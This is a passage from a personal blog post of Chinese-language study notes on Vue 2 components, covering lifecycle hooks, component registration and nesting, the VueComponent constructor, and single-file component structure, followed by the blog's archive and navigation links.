<p>beforeDestroy(){}  这里对数据的所有修改，都不会触发页面更新 常用于清楚定时器 解绑自定义事件</p>
<p>destroyed(){}</p>
<h4 id="对组件的理解"><a href="#对组件的理解" class="headerlink" title="对组件的理解:"></a>对组件的理解:</h4><p>复用性</p>
<p>非单文件组件:一个文件里面有多个组件<br>创建组件:<br>const rain&#x3D;Vue.extend({<br>name：’atguigu’,这行代码作用 仅仅是开发者工具里呈现的组件名称<br>template:<code>&lt; div&gt;....&lt; /div&gt;</code><br>data(){<br>return {<br>schoolName:’’,<br>…<br>}<br>}<br>       组件中的 data如果是对象形式，那么复用的时候，是同一个对象，当自己修改的时候，别人的如果也复用了这个文件，data也会被更改（即避免组件复用时，存在引用关系）<br>但是vm实例可以写成对象形式<br>}</p>
<p>})</p>
<p>const shine&#x3D;….</p>
<p>创建vm（局部注册组件）<br>new Vue({<br>el:’#root’,<br>components:{<br>rain， 这里的rain如果是一个对象，如果本身没有调用，会默认调用Vue.extend方法<br>shine,<br>这里如果出现多个单词的  如’my-school’:s   写的时候&lt; my-school&gt;&lt; &#x2F;my-school&gt; 页面最后呈现是<br>&lt; MySchool&gt;<br>也可以<br>MySchool:s  写的时候 &lt; MySchool&gt;&lt; &#x2F;MySchool&gt;（这种只有在脚手架中才可以）<br>}</p>
<p>})</p>
<p>全局注册组件：<br>Vue.component(‘rain’,rain) 组件名  组件</p>
<p>写入组件</p>
<p>&lt; div id&#x3D;’root’&gt;&lt; rain&gt;&lt; &#x2F;rain&gt;&lt; &#x2F;div&gt;<br>也可以<br>&lt; div id&#x3D;’root’&gt;&lt; rain&#x2F;&gt; 自闭和的形式 但也得在脚手架环境下 （如果不是，也不会报错，但不能复用）才可以复用&lt; &#x2F;div&gt;</p>
<h4 id="组件的嵌套"><a href="#组件的嵌套" class="headerlink" title="组件的嵌套:"></a>组件的嵌套:</h4><p>const shine&#x3D;….</p>
<p>const rain&#x3D;Vue.extend({<br>template:<code>&lt; div&gt;....&lt; shine&gt;&lt; /shine&gt; &lt; /div&gt;</code><br>data(){<br>return {<br>schoolName:’’,<br>…<br>},<br>components:{<br>shine<br>}<br>}</p>
<p>new Vue({<br>el:’#root’,<br>components:{<br>rain，</p>
<p>}</p>
<h4 id="VueComponent构造函数"><a href="#VueComponent构造函数" class="headerlink" title="VueComponent构造函数:"></a>VueComponent构造函数:</h4><p>如:前面  const rain&#x3D;Vue.extend({…})<br>这里的rain本身是 f VueComponent(options){this._init(options)}</p>
<p>总结:<br>1 rain组件本质是一个名为VueComponent的构造函数,且不是程序员定义的，是Vue.extend生成的<br>2 只要写&lt; rain&#x2F;&gt;或者 &lt; rain&gt;&lt; &#x2F;rain&gt;，Vue解析时会帮我们创建rain组件的实例对象,即Vue帮我们执行了:new VueComponent(options)<br>3 每次调用Vue.extend,返回的都是一个全新的VueComponent<br>4<br>组件配置中:<br>data函数,methods函数,watch中的函数，computed中的函数,他们的this均是VueComponent实例对象</p>
<p>new Vue(options)配置中:data函数,methods中的函数,watch中的函数，compputed中的函数，它们的this均是Vue实例对象</p>
<p>5 VueComponent实例对象以后简称 vc<br>  Vue的实例对象 简称vm</p>
<h4 id="一个重要的内置关系"><a href="#一个重要的内置关系" class="headerlink" title="一个重要的内置关系:"></a>一个重要的内置关系:</h4><p>VueComponent(这里得写组件实例名).prototype.<strong>proto</strong>&#x3D;&#x3D;&#x3D;Vue.prototype  true</p>
<p>可以让组件实例对象(vc)访问到Vue原型链上的属性，方法</p>
<h4 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件:"></a>单文件组件:</h4><p>标签的高亮效果: vscode应用商店 里Vetur插件<br>如 rain.vue<br>快捷键:&lt;v +回车<br>&lt; template&gt;&lt; &#x2F;template&gt;<br>&lt; script&gt;<br>export default{ 这里的default后面省略Vue.extend</p>
<p>}&lt; &#x2F;script&gt;<br>&lt; style&gt;&lt; &#x2F;style&gt;</p>
<p>准备一个容器<br>index.html<br>&lt; div id&#x3D;’root’&gt;<br>&lt; App&gt;&lt; &#x2F;App&gt;&lt; &#x2F;div&gt;<br>&lt; script  src&#x3D;’…vue.js’&gt;&lt; &#x2F;script&gt;<br>&lt; script  src&#x3D;’…main.js’&gt;&lt; &#x2F;script&gt; </p>
<p>main.js: 入口文件<br>import App from ‘.&#x2F;App.vue’  于是来到    App.vue<br>new Vue({<br>el:’#root’,<br>如果上面不写 可以在这里  template:<code>&lt; App&gt;&lt; /App&gt;</code>,<br>components:{App}<br>})</p>
<p>App.vue 这里汇总所有组件<br>&lt; template&gt;<br>&lt; div&gt;…&lt; &#x2F;div&gt;<br>&lt; &#x2F;template&gt;</p>
<p>&lt; script&gt;</p>
<p>&lt; &#x2F;script&gt;<br>….</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/25/vue2-0-3-0/" data-id="cl1dgisuh0006ngnobw1k05gt" data-title="vue2.0+3.0" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2022/03/22/ES6-11/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">ES6-11</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/03/25/vue2-0-3-0/">vue2.0+3.0</a>
          </li>
        
          <li>
            <a href="/2022/03/22/ES6-11/">ES6-11</a>
          </li>
        
          <li>
            <a href="/2022/03/17/ajax/">ajax</a>
          </li>
        
          <li>
            <a href="/2022/02/25/js2/">js2</a>
          </li>
        
          <li>
            <a href="/2022/02/25/%E8%AE%A1%E7%AE%97%E9%A2%98/">计算题</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>